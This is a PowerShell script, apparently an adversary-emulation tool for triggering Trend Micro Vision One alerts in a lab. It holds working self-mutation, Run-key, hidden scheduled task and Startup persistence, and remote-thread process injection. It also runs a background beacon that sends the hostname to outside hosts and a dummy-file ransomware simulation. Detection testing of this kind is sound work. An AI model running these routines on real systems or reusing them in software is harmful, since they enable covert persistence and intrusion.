#Requires -Version 5.1
# MUTATION_MARKER_INITIAL01
<#
.SYNOPSIS
    Polymorphic Malware Behavior Simulator for Trend Micro Testing
.DESCRIPTION
    Simulates polymorphic malware behaviors to generate Vision One workbenches.
    FOR AUTHORIZED SECURITY TESTING ONLY. Use only in approved lab environments
    with Trend Micro Standard Endpoint Protection or Apex One installed.

    Modules:
      1. EICAR Drop          → Vision One: Malware Detection
      2. File Mutation        → Vision One: Polymorphic evasion simulation
      3. Persistence          → Vision One: Suspicious Behavior (T1547, T1053)
      4. Process Injection    → Vision One: Suspicious Behavior (T1055)
      5. C2 Beacon           → Vision One: Network Correlation (T1071)
      6. Ransomware Sim       → Vision One: Ransomware Indicators (T1486)

.PARAMETER C2Target
    Additional C2 beacon target hostname/IP (default: puginarug.com)
.PARAMETER BeaconInterval
    Seconds between beacon rounds (default: 30)
.PARAMETER Cleanup
    Remove ALL artifacts created by this script
.PARAMETER NoInject
    Skip process injection module (use if not running as Administrator)
.PARAMETER NoRansom
    Skip ransomware simulation module
.PARAMETER NoPersist
    Skip persistence installation
.PARAMETER NoBeacon
    Skip C2 beacon module
.PARAMETER NoEicar
    Skip EICAR file drop
.PARAMETER Silent
    Suppress console output (log file only)

.EXAMPLE
    # Full simulation (run as Administrator for injection module)
    .\polymorphic-demo.ps1

    # Skip injection (non-admin)
    .\polymorphic-demo.ps1 -NoInject

    # Custom C2 target, faster beaconing
    .\polymorphic-demo.ps1 -C2Target "203.0.113.5" -BeaconInterval 15

    # Clean up all artifacts after demo
    .\polymorphic-demo.ps1 -Cleanup
#>
param(
    [string]$C2Target       = "puginarug.com",
    [int]$BeaconInterval    = 30,
    [switch]$Cleanup,
    [switch]$NoInject,
    [switch]$NoRansom,
    [switch]$NoPersist,
    [switch]$NoBeacon,
    [switch]$NoEicar,
    [switch]$Silent
)

$ErrorActionPreference = "SilentlyContinue"

#region ── Constants ─────────────────────────────────────────────────────────

$ARTIFACT_NAME = "WinSvcHost32"
$LOGFILE       = "$env:TEMP\polymorphic_demo_log.txt"
$APPDATA_COPY  = "$env:APPDATA\Microsoft\Windows\$ARTIFACT_NAME.ps1"
$STARTUP_COPY  = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$ARTIFACT_NAME.ps1"
$REG_PATH      = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# C2 targets — rotated each beacon round
# 1. Trend Micro's own WRS test endpoint (guaranteed network reputation alert)
# 2. Known-bad test host
# 3. User-supplied target
$C2_TARGETS = @(
    "https://wrs.test.trendmicro.com/EVIL",
    "https://wrs49.winshipway.com",
    "http://$C2Target"
)

#endregion

#region ── Logging ────────────────────────────────────────────────────────────

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("INFO","WARN","ERROR","MODULE","OK")][string]$Level = "INFO"
    )
    $ts    = Get-Date -Format "HH:mm:ss"
    $entry = "[$ts][$Level] $Message"
    if (-not $Silent) {
        $color = switch ($Level) {
            "MODULE" { "Cyan"    }
            "OK"     { "Green"   }
            "WARN"   { "Yellow"  }
            "ERROR"  { "Red"     }
            default  { "White"   }
        }
        Write-Host $entry -ForegroundColor $color
    }
    Add-Content -Path $LOGFILE -Value $entry -ErrorAction SilentlyContinue
}

#endregion

#region ── Helper: Admin Check ───────────────────────────────────────────────

function Test-IsAdmin {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = [System.Security.Principal.WindowsPrincipal]$id
    return $pr.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

#endregion

#region ── Module 1: EICAR Drop ──────────────────────────────────────────────
# Triggers: Trend Micro MALWR detection → Vision One Malware Detection workbench
# MITRE: N/A (test file, not a technique)

function Invoke-EicarDrop {
    Write-Log "MODULE 1: EICAR Drop" "MODULE"
    Write-Log "  Target: Vision One Malware Detection alert"

    # Assemble EICAR string at runtime so this script file is not blocked by AV
    # when being copied to the test machine. The EICAR standard test file is defined
    # at https://www.eicar.org/download-anti-malware-testfile/
    $p1   = "X5O!P%@AP[4\PZX54(P^)"
    $p2   = "7CC)7}"
    $p3   = '$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    $eicar = $p1 + $p2 + $p3

    $guid    = [System.Guid]::NewGuid().ToString("N").Substring(0, 8)
    $outPath = "$env:TEMP\eicar_test_$guid.com"

    [System.IO.File]::WriteAllText($outPath, $eicar, [System.Text.Encoding]::ASCII)
    Write-Log "  Dropped: $outPath" "OK"
    Write-Log "  Expect: Immediate MALWR alert + Vision One workbench entry"
    return $outPath
}

#endregion

#region ── Module 2: File Mutation ───────────────────────────────────────────
# Triggers: Each generated copy has a different hash → evades hash-based detection
# MITRE: T1027 - Obfuscated Files or Information

function Invoke-Mutation {
    param([int]$Generation = 0, [int]$MaxGen = 3)

    Write-Log "MODULE 2: Polymorphic Mutation Chain (gen $Generation)" "MODULE"
    Write-Log "  Technique: T1027 - each generation has unique hash, same behavior"
    Write-Log "  Depth: $MaxGen generations"

    if ($Generation -ge $MaxGen) {
        Write-Log "  Mutation chain complete ($MaxGen unique hashes generated)" "OK"
        return $null
    }

    $srcPath = $MyInvocation.ScriptName
    if (-not $srcPath) { $srcPath = $PSCommandPath }

    $source = Get-Content $srcPath -Raw -ErrorAction Stop

    # Replace the mutation marker — changes SHA-256 while preserving all logic
    $newMarker = "MUTATION_MARKER_" + [System.Guid]::NewGuid().ToString("N").ToUpper().Substring(0, 8)
    $mutated   = $source -replace 'MUTATION_MARKER_[A-Z0-9]+', $newMarker

    $nextGen  = $Generation + 1
    $guid     = [System.Guid]::NewGuid().ToString("N").Substring(0, 8)
    $mutPath  = "$env:TEMP\WinSvcHost_gen${nextGen}_${guid}.ps1"

    Set-Content -Path $mutPath -Value $mutated -Encoding UTF8

    $origHash = (Get-FileHash $srcPath -Algorithm SHA256).Hash.Substring(0, 12)
    $mutHash  = (Get-FileHash $mutPath -Algorithm SHA256).Hash.Substring(0, 12)

    Write-Log "  GEN $Generation -> GEN $nextGen"
    Write-Log "    Parent hash : ${origHash}...  ($([System.IO.Path]::GetFileName($srcPath)))"
    Write-Log "    Mutant hash : ${mutHash}...  ($([System.IO.Path]::GetFileName($mutPath)))"

    # Spawn the mutant — it detects POLY_GEN and only re-mutates without re-running all modules
    $env:POLY_GEN = "$nextGen"
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName  = "powershell.exe"
    $psi.Arguments = "-ExecutionPolicy Bypass -File `"$mutPath`""
    $psi.UseShellExecute = $true
    $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Normal
    $proc = [System.Diagnostics.Process]::Start($psi)
    $env:POLY_GEN = $null

    Write-Log "    Spawned gen $nextGen (PID $($proc.Id))" "OK"
    Write-Log "    Expect: Vision One sees new process from TEMP with different hash"
    return $mutPath
}

#endregion

#region ── Module 3: Persistence ─────────────────────────────────────────────
# Triggers: Vision One Suspicious Behavior (persistence alert)
# MITRE: T1547.001 (Registry Run Keys), T1053.005 (Scheduled Task), T1547.001 (Startup Folder)

function Install-Persistence {
    Write-Log "MODULE 3: Persistence Installation" "MODULE"
    Write-Log "  Techniques: T1547.001 (Registry/Startup), T1053.005 (Scheduled Task)"

    $srcPath = $MyInvocation.ScriptName
    if (-not $srcPath) { $srcPath = $PSCommandPath }

    # Copy script to AppData (hidden persistence location)
    Copy-Item $srcPath -Destination $APPDATA_COPY -Force
    Write-Log "  Script copy: $APPDATA_COPY"

    $runCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$APPDATA_COPY`""

    # 1. Registry Run Key (HKCU — no admin required)
    Set-ItemProperty -Path $REG_PATH -Name $ARTIFACT_NAME -Value $runCmd -Force
    Write-Log "  Registry: $REG_PATH\$ARTIFACT_NAME" "OK"

    # 2. Scheduled Task (ONLOGON trigger)
    $action   = New-ScheduledTaskAction -Execute "powershell.exe" `
                    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$APPDATA_COPY`""
    $trigger  = New-ScheduledTaskTrigger -AtLogon
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries
    Register-ScheduledTask -TaskName $ARTIFACT_NAME -Action $action `
        -Trigger $trigger -Settings $settings -Force | Out-Null
    Write-Log "  Scheduled task: $ARTIFACT_NAME (ONLOGON, hidden)" "OK"

    # 3. Startup Folder
    Copy-Item $srcPath -Destination $STARTUP_COPY -Force
    Write-Log "  Startup folder: $STARTUP_COPY" "OK"

    Write-Log "  Expect: Vision One T1547/T1053 persistence alerts"
}

#endregion

#region ── Module 4: Process Injection Simulation ────────────────────────────
# Triggers: Vision One Suspicious Behavior (process injection alert)
# MITRE: T1055.002 - Portable Executable Injection
#
# Safe payload: x64 opcodes [0x48, 0x31, 0xC0, 0xC3]
#   xor rax, rax   (clear return value)
#   ret            (return immediately)
# The thread starts, returns 0, and exits cleanly. No harmful operation.
# The OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
# API call sequence is what Trend Micro behavioral engine records.

function Invoke-ProcessInjection {
    Write-Log "MODULE 4: Process Injection Simulation" "MODULE"
    Write-Log "  Technique: T1055.002 - PE Injection API sequence"

    if (-not (Test-IsAdmin)) {
        Write-Log "  Skipped: requires Administrator privileges" "WARN"
        Write-Log "  Re-run as Administrator to trigger this module"
        return
    }

    # Load Windows API via P/Invoke (compiled at runtime by Add-Type)
    $csCode = @'
using System;
using System.Runtime.InteropServices;

public class Injector {
    const uint PROCESS_ALL_ACCESS     = 0x1F0FFF;
    const uint MEM_COMMIT             = 0x00001000;
    const uint MEM_RESERVE            = 0x00002000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwAccess, bool bInherit, int dwPID);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr lpAddr,
        uint dwSize, uint flAllocType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr lpBase,
        byte[] lpBuf, uint nSize, out IntPtr lpWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr lpAttr,
        uint dwStack, IntPtr lpStart, IntPtr lpParam, uint dwFlags, out uint lpTID);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMs);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public static string Inject(int pid, byte[] payload) {
        IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hProc == IntPtr.Zero)
            return "OpenProcess failed: " + Marshal.GetLastWin32Error();

        IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)payload.Length,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (addr == IntPtr.Zero) {
            CloseHandle(hProc);
            return "VirtualAllocEx failed: " + Marshal.GetLastWin32Error();
        }

        IntPtr written;
        if (!WriteProcessMemory(hProc, addr, payload, (uint)payload.Length, out written)) {
            CloseHandle(hProc);
            return "WriteProcessMemory failed: " + Marshal.GetLastWin32Error();
        }

        uint tid;
        IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0,
            addr, IntPtr.Zero, 0, out tid);
        if (hThread != IntPtr.Zero) {
            WaitForSingleObject(hThread, 2000);
            CloseHandle(hThread);
            CloseHandle(hProc);
            return string.Format("OK: thread {0} @ 0x{1:X}, wrote {2} bytes", tid, addr.ToInt64(), written.ToInt64());
        }

        CloseHandle(hProc);
        return "CreateRemoteThread failed: " + Marshal.GetLastWin32Error();
    }
}
'@

    try {
        Add-Type -TypeDefinition $csCode -Language CSharp | Out-Null
    }
    catch {
        Write-Log "  Add-Type failed: $_" "ERROR"
        return
    }

    # Find a suitable injection target in System32
    $candidates = @("notepad.exe", "mspaint.exe", "write.exe")
    $targetExe  = $candidates | Where-Object {
        Test-Path "$env:SystemRoot\System32\$_"
    } | Select-Object -First 1

    if (-not $targetExe) {
        Write-Log "  No suitable target process found" "ERROR"
        return
    }

    Write-Log "  Spawning target: $targetExe"
    $proc = Start-Process $targetExe -WindowStyle Hidden -PassThru
    if (-not $proc) {
        Write-Log "  Failed to start $targetExe" "ERROR"
        return
    }

    Start-Sleep -Milliseconds 500

    # Safe x64 payload: xor rax,rax (0x48 0x31 0xC0) + ret (0xC3)
    # Thread starts, immediately returns 0. Harmless.
    [byte[]]$payload = @(0x48, 0x31, 0xC0, 0xC3)

    Write-Log "  Target PID: $($proc.Id)"
    Write-Log "  OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread"

    $result = [Injector]::Inject($proc.Id, $payload)
    Write-Log "  Result: $result" "OK"

    Start-Sleep -Milliseconds 1000
    Stop-Process -Id $proc.Id -Force
    Write-Log "  Target process killed"
    Write-Log "  Expect: Vision One T1055.002 process injection alert"
}

#endregion

#region ── Module 5: C2 Beacon ────────────────────────────────────────────────
# Triggers: Vision One Network Correlation (C2/malicious URL detection)
# MITRE: T1071.001 (Web Protocols), T1571 (Non-Standard Port)

function Start-C2Beacon {
    Write-Log "MODULE 5: C2 Beacon" "MODULE"
    Write-Log "  Technique: T1071.001 - periodic beacon to $($C2_TARGETS -join ', ')"
    Write-Log "  Interval: $BeaconInterval seconds"

    $targets   = $C2_TARGETS
    $interval  = $BeaconInterval

    $beaconBlock = {
        param($targets, $interval)

        # Malware-realistic User-Agent strings (rotate each round)
        $userAgents = @(
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
            "WinHTTP/1.1",
            "Microsoft-Symbol-Server/6.3.9600.17095",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13"
        )

        $botID   = [System.Guid]::NewGuid().ToString("N").Substring(0, 16)
        $counter = 0

        while ($true) {
            foreach ($target in $targets) {
                try {
                    $ua = $userAgents[$counter % $userAgents.Count]
                    $headers = @{
                        "User-Agent"     = $ua
                        "X-Bot-ID"       = $botID
                        "X-Victim-Host"  = $env:COMPUTERNAME
                        "X-Counter"      = "$counter"
                    }
                    $resp = Invoke-WebRequest -Uri $target -Headers $headers `
                                -TimeoutSec 10 -UseBasicParsing -ErrorAction Stop
                    Write-Host "[BEACON] #$counter → $target [$($resp.StatusCode)]"
                }
                catch {
                    Write-Host "[BEACON] #$counter → $target [no response]"
                }
            }
            $counter++
            Start-Sleep -Seconds $interval
        }
    }

    $job = Start-Job -ScriptBlock $beaconBlock -ArgumentList $targets, $interval
    Write-Log "  Beacon job started (ID: $($job.Id))" "OK"
    Write-Log "  Expect: Vision One network correlation alert for each target"
    return $job
}

#endregion

#region ── Module 6: Ransomware Simulation ───────────────────────────────────
# Triggers: Vision One Ransomware Indicators (mass file read+encrypt+rename)
# MITRE: T1486 (Data Encrypted for Impact), T1083 (File and Directory Discovery)

function Invoke-RansomwareSimulation {
    Write-Log "MODULE 6: Ransomware Simulation" "MODULE"
    Write-Log "  Techniques: T1486 (encryption), T1083 (file discovery)"

    # Create isolated staging directory in TEMP (never touches real user files)
    $guid     = "{0:X8}" -f (Get-Random)
    $ransomDir = "$env:TEMP\Documents_Backup_$guid"
    New-Item -ItemType Directory -Path $ransomDir | Out-Null
    Write-Log "  Working directory: $ransomDir"

    # File types to simulate (realistic document mix)
    $exts  = @(".docx",".xlsx",".pdf",".jpg",".png",".txt",".csv",".pptx",".db",".bak")
    $count = 75

    Write-Log "  Creating $count test files..."
    for ($i = 1; $i -le $count; $i++) {
        $ext  = $exts[$i % $exts.Count]
        $name = "Document_{0:D3}{1}" -f $i, $ext
        $body = "CONFIDENTIAL DOCUMENT $i`r`nCreated: $(Get-Date -Format 'o')`r`n" +
                ("Lorem ipsum dolor sit amet. " * (50 + (Get-Random -Max 100)))
        [System.IO.File]::WriteAllText("$ransomDir\$name", $body,
            [System.Text.Encoding]::UTF8)
    }

    # "Encrypt" via XOR 0x42 (recoverable — purely for behavioral detection trigger)
    Write-Log "  Encrypting files (XOR 0x42 simulation)..."
    $encKey    = [byte]0x42
    $encrypted = 0

    Get-ChildItem $ransomDir -File | ForEach-Object {
        $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
        for ($j = 0; $j -lt $bytes.Length; $j++) {
            $bytes[$j] = $bytes[$j] -bxor $encKey
        }
        [System.IO.File]::WriteAllBytes($_.FullName, $bytes)

        # Rename to .polyenc (high-volume rename is the ransomware behavioral trigger)
        $newName = $_.BaseName + ".polyenc"
        Rename-Item -Path $_.FullName -NewName $newName -Force
        $encrypted++
    }

    # Drop ransom note (triggers ransomware heuristics)
    $note = @"
YOUR FILES HAVE BEEN ENCRYPTED
================================

[THIS IS A SECURITY TESTING SIMULATION]
[NOT REAL RANSOMWARE — FOR AUTHORIZED TREND MICRO TESTING ONLY]

$encrypted files in this folder have been encrypted.

Technical recovery details:
  Algorithm : XOR
  Key       : 0x42
  Extension : .polyenc

To decrypt: XOR each byte of each .polyenc file with 0x42
PowerShell: `$b = [IO.File]::ReadAllBytes('file.polyenc'); for(`$i=0;`$i -lt `$b.Length;`$i++){`$b[`$i]=`$b[`$i] -bxor 0x42}; [IO.File]::WriteAllBytes('file.docx',`$b)
"@
    Set-Content -Path "$ransomDir\README_DECRYPT.txt" -Value $note

    Write-Log "  Encrypted $encrypted files → renamed to .polyenc" "OK"
    Write-Log "  Ransom note: $ransomDir\README_DECRYPT.txt"
    Write-Log "  Expect: Vision One ransomware alert (T1486, T1083)"
    return $ransomDir
}

#endregion

#region ── Cleanup ────────────────────────────────────────────────────────────

function Invoke-Cleanup {
    Write-Log "=== CLEANUP MODE ===" "WARN"
    Write-Log "Removing all artifacts created by polymorphic-demo.ps1"

    # Registry
    Remove-ItemProperty -Path $REG_PATH -Name $ARTIFACT_NAME -ErrorAction SilentlyContinue
    Write-Log "  Registry key removed"

    # Scheduled task
    Unregister-ScheduledTask -TaskName $ARTIFACT_NAME -Confirm:$false -ErrorAction SilentlyContinue
    Write-Log "  Scheduled task removed"

    # AppData copy
    Remove-Item $APPDATA_COPY  -Force -ErrorAction SilentlyContinue
    Write-Log "  AppData copy removed"

    # Startup folder copy
    Remove-Item $STARTUP_COPY  -Force -ErrorAction SilentlyContinue
    Write-Log "  Startup folder entry removed"

    # TEMP artifacts
    Get-ChildItem $env:TEMP -Filter "eicar_test_*.com"      | Remove-Item -Force
    Get-ChildItem $env:TEMP -Filter "WinSvcHost_*.ps1"      | Remove-Item -Force
    Get-ChildItem $env:TEMP -Filter "Documents_Backup_*" -Directory | Remove-Item -Force -Recurse
    Get-ChildItem $env:TEMP -Filter "polymorphic_demo_log.txt"      | Remove-Item -Force
    Write-Log "  TEMP artifacts removed"

    # Stop beacon jobs
    Get-Job | Where-Object { $_.State -eq "Running" } | ForEach-Object {
        Stop-Job -Job $_
        Remove-Job -Job $_
    }
    Write-Log "  Background jobs stopped"

    Write-Log "=== CLEANUP COMPLETE ===" "OK"
}

#endregion

#region ── Main Execution ─────────────────────────────────────────────────────

$banner = @"

  ╔══════════════════════════════════════════════════════════════════╗
  ║   POLYMORPHIC MALWARE BEHAVIOR SIMULATOR v1.0                    ║
  ║   Trend Micro SEPA / Apex One / Vision One Demo                  ║
  ║   FOR AUTHORIZED SECURITY TESTING ONLY                           ║
  ╚══════════════════════════════════════════════════════════════════╝

"@
Write-Host $banner -ForegroundColor Red

# ── Chain-child detection ────────────────────────────────────────────────────
# When POLY_GEN is set, this script is a mutation chain child.
# It only re-mutates and spawns the next generation — all other modules are skipped.
if ($env:POLY_GEN -ne $null -and $env:POLY_GEN -ne "") {
    $myGen = [int]$env:POLY_GEN
    Write-Log "[CHAIN GEN $myGen] Polymorphic child active — hash differs from parent" "MODULE"
    Write-Log "[CHAIN GEN $myGen] Pausing 2s for Trend Micro behavioral scan..."
    Start-Sleep -Seconds 2
    Invoke-Mutation -Generation $myGen -MaxGen 3
    exit 0
}
# ─────────────────────────────────────────────────────────────────────────────

if ($Cleanup) {
    Invoke-Cleanup
    exit 0
}

Write-Log "Host      : $env:COMPUTERNAME ($env:USERNAME)"
Write-Log "Start time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
Write-Log "Admin     : $(Test-IsAdmin)"
Write-Log "Log file  : $LOGFILE"
Write-Log "Modules   : Eicar=$(! $NoEicar) Mutate=true Persist=$(! $NoPersist) Inject=$(! $NoInject) Beacon=$(! $NoBeacon) Ransom=$(! $NoRansom)"
Write-Host ""

# ── Module 1: EICAR ──────────────────────────────────────────────────────────
if (-not $NoEicar) {
    $eicarPath = Invoke-EicarDrop
    Write-Host ""
    Start-Sleep -Seconds 2
}

# ── Module 2: Mutation ───────────────────────────────────────────────────────
$mutantPath = Invoke-Mutation
Write-Host ""

# ── Module 3: Persistence ────────────────────────────────────────────────────
if (-not $NoPersist) {
    Install-Persistence
    Write-Host ""
}

# ── Module 4: Process Injection ──────────────────────────────────────────────
if (-not $NoInject) {
    Invoke-ProcessInjection
    Write-Host ""
}

# ── Module 5: C2 Beacon (background) ─────────────────────────────────────────
$beaconJob = $null
if (-not $NoBeacon) {
    $beaconJob = Start-C2Beacon
    Write-Host ""
}

# ── Module 6: Ransomware Simulation ──────────────────────────────────────────
$ransomDir = $null
if (-not $NoRansom) {
    $ransomDir = Invoke-RansomwareSimulation
    Write-Host ""
}

# ── Summary ───────────────────────────────────────────────────────────────────
Write-Host ""
Write-Log "╔══════════════════════════════════════════════════════════════════╗" "OK"
Write-Log "║  ALL MODULES COMPLETE                                            ║" "OK"
Write-Log "╚══════════════════════════════════════════════════════════════════╝" "OK"
Write-Log "Check Vision One console → Workbench → filter by host: $env:COMPUTERNAME"
Write-Log "Allow 2-5 minutes for event correlation to produce workbenches"
Write-Log ""
Write-Log "Expected Vision One alerts:"
Write-Log "  [Malware]    EICAR test file detected"
Write-Log "  [Behavior]   Process injection (T1055.002)"
Write-Log "  [Behavior]   Registry run key added (T1547.001)"
Write-Log "  [Behavior]   Scheduled task created (T1053.005)"
Write-Log "  [Network]    C2 beacon to malicious URL (T1071.001)"
Write-Log "  [Ransom]     Mass file encryption + rename (T1486)"
Write-Log ""
if ($beaconJob) {
    Write-Log "Beacon is running (Job $($beaconJob.Id)) — press Ctrl+C to stop or run -Cleanup"
    Write-Log "To monitor beacon: Receive-Job -Job (Get-Job -Id $($beaconJob.Id)) -Keep"
}
Write-Log ""
Write-Log "When demo is complete, remove all artifacts:"
Write-Log "  .\polymorphic-demo.ps1 -Cleanup"

#endregion
